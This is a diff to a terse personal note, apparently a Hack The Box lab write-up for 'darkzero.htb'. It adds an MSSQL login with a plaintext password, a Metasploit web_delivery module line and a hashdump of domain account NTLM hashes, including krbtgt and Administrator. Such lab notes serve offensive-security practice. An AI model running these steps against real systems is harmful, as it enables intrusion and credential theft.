@@ -1,6 +1,6 @@
 
 # Summary
-
+#mssql
 
 ---
 
@@ -33,3 +33,21 @@ PORT     STATE SERVICE       REASON          VERSION
 ```
 
 Trying to use `nxc`, found that `NTLM` authentication is disabled. So, if we want to use anything we should use `kerberose`.
+
+Try to get inside mssql
+```
+mssqlclient.py  'darkzero.htb/john.w:RFulUtONCOL!@10.129.77.28' -windows-auth
+```
+use exploit/multi/script/web_delivery
+
+
+
+```
+hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
+svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
+DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
+darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
+```
